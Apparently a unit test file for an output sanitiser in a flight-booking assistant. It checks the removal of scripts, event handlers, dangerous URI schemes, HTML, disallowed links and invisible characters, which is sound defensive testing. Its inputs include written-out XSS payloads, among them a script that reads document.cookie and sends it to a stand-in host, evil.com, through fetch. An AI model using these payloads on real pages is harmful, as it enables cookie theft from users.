/**
 * OutputSanitiser unit tests (WO-061, AC5, AC6, AC7, AC11).
 */

import { describe, it, expect } from "vitest";
import { OutputSanitiser } from "../../../src/domain/safety/OutputSanitiser.js";
import {
  XSS_PAYLOADS,
} from "../../fixtures/adversarial/payloads.js";
import {
  GOLDEN_SANITISED,
} from "../../fixtures/adversarial/golden-sanitised-output.js";

const sanitiser = new OutputSanitiser();

describe("OutputSanitiser — script removal (AC5)", () => {
  it("removes <script> blocks", () => {
    const { safeText, actions } = sanitiser.sanitise("<script>alert('xss')</script>");
    expect(safeText).not.toContain("<script>");
    expect(safeText).not.toContain("alert(");
    expect(actions.some((a) => a.kind === "script_removed")).toBe(true);
  });

  it("removes case-insensitive <SCRIPT> blocks", () => {
    const { safeText } = sanitiser.sanitise("<SCRIPT>evil()</SCRIPT>");
    expect(safeText).not.toContain("<SCRIPT>");
    expect(safeText).not.toContain("evil()");
  });

  it("removes inline script in multi-line block", () => {
    const input = "<script>\nvar x = document.cookie;\nfetch('http://evil.com?c='+x);\n</script>";
    const { safeText } = sanitiser.sanitise(input);
    expect(safeText).not.toContain("document.cookie");
  });
});

describe("OutputSanitiser — event handler removal (AC5)", () => {
  it("removes onXxx= attributes", () => {
    const { safeText, actions } = sanitiser.sanitise('<img src="x" onerror="alert(1)">');
    expect(safeText).not.toContain("onerror=");
    expect(safeText).not.toContain("alert(1)");
    expect(actions.some((a) => a.kind === "event_handler_removed")).toBe(true);
  });

  it("removes onclick handler", () => {
    const { safeText } = sanitiser.sanitise('<button onclick="steal()">Click</button>');
    expect(safeText).not.toContain("onclick=");
    expect(safeText).not.toContain("steal()");
  });

  it("removes onload handler", () => {
    const { safeText } = sanitiser.sanitise('<body onload="init()">');
    expect(safeText).not.toContain("onload=");
  });
});

describe("OutputSanitiser — dangerous URI scheme removal (AC5)", () => {
  it("replaces javascript: scheme", () => {
    const { safeText, actions } = sanitiser.sanitise('Click <a href="javascript:alert(1)">here</a>');
    expect(safeText).not.toContain("javascript:");
    expect(actions.some((a) => a.kind === "dangerous_uri_scheme_removed")).toBe(true);
  });

  it("replaces data: scheme", () => {
    const { safeText } = sanitiser.sanitise('<img src="data:image/svg+xml,<svg>...</svg>">');
    expect(safeText).not.toContain("data:");
  });

  it("replaces vbscript: scheme", () => {
    const { safeText } = sanitiser.sanitise('vbscript:MsgBox("xss")');
    expect(safeText).not.toContain("vbscript:");
  });
});

describe("OutputSanitiser — HTML stripping (AC5)", () => {
  it("strips remaining HTML tags", () => {
    const { safeText } = sanitiser.sanitise("<b>Hello</b> <i>world</i>");
    expect(safeText).not.toContain("<b>");
    expect(safeText).not.toContain("<i>");
    expect(safeText).toContain("Hello");
    expect(safeText).toContain("world");
  });

  it("records html_stripped action", () => {
    const { actions } = sanitiser.sanitise("<div>text</div>");
    expect(actions.some((a) => a.kind === "html_stripped")).toBe(true);
  });
});

describe("OutputSanitiser — link host allow-listing (AC6)", () => {
  it("allows link with https scheme and allowed host through", () => {
    const { safeText, actions } = sanitiser.sanitise(
      "[Book flight](https://www.amadeus.com/flights)",
    );
    expect(safeText).toContain("https://www.amadeus.com/flights");
    expect(actions.some((a) => a.kind === "disallowed_link_host_inerted")).toBe(false);
  });

  it("inerts markdown link with disallowed host", () => {
    const { safeText, actions } = sanitiser.sanitise(
      "[Click here](https://evil.com/steal)",
    );
    // Link URL should be removed, text preserved as inert
    expect(safeText).toContain("Click here");
    expect(safeText).not.toContain("evil.com");
    expect(actions.some((a) => a.kind === "disallowed_link_host_inerted")).toBe(true);
  });

  it("inerts markdown link with javascript scheme", () => {
    const { safeText } = sanitiser.sanitise("[Book now](javascript:void(0))");
    expect(safeText).toContain("Book now");
    expect(safeText).not.toContain("javascript:");
  });

  it("sanitiser with empty allowedHosts allows all https links through", () => {
    const permissiveSanitiser = new OutputSanitiser({ allowedHosts: [] });
    const { safeText } = permissiveSanitiser.sanitise(
      "[Link](https://any.host.example.com/path)",
    );
    expect(safeText).toContain("https://any.host.example.com/path");
  });
});

describe("OutputSanitiser — invisible character stripping (AC7)", () => {
  it("strips zero-width space from output", () => {
    const { safeText, actions } = sanitiser.sanitise("Hello​World"); // contains U+200B
    expect(safeText).toBe("HelloWorld");
    expect(actions.some((a) => a.kind === "invisible_chars_stripped")).toBe(true);
  });

  it("preserves visible text intact", () => {
    const { safeText } = sanitiser.sanitise("Flights from London to Paris");
    expect(safeText).toBe("Flights from London to Paris");
  });
});

describe("OutputSanitiser — actions report for telemetry (AC9)", () => {
  it("returns empty actions array for clean text", () => {
    const { actions } = sanitiser.sanitise("Your flight LHR→CDG departs at 08:00.");
    expect(actions).toHaveLength(0);
  });

  it("actions include non-zero counts", () => {
    const { actions } = sanitiser.sanitise("<b>text</b><b>more</b>");
    const htmlAction = actions.find((a) => a.kind === "html_stripped");
    expect(htmlAction?.count).toBeGreaterThanOrEqual(2);
  });
});

describe("OutputSanitiser — golden file tests (AC13)", () => {
  for (const golden of GOLDEN_SANITISED) {
    it(`golden ${golden.payloadId}: sanitised output matches expected`, () => {
      const { safeText } = sanitiser.sanitise(golden.input);
      expect(safeText).toBe(golden.expectedSafeText);
    });

    it(`golden ${golden.payloadId}: forbidden fragments absent`, () => {
      const { safeText } = sanitiser.sanitise(golden.input);
      for (const fragment of golden.forbiddenFragments) {
        expect(safeText).not.toContain(fragment);
      }
    });
  }
});

describe("OutputSanitiser — XSS adversarial corpus (AC10)", () => {
  for (const payload of XSS_PAYLOADS) {
    if (!payload.forbiddenFragment) continue;
    it(`XSS payload ${payload.id}: forbidden fragment absent from sanitised output`, () => {
      const { safeText } = sanitiser.sanitise(payload.text);
      expect(safeText).not.toContain(payload.forbiddenFragment);
    });
  }
});
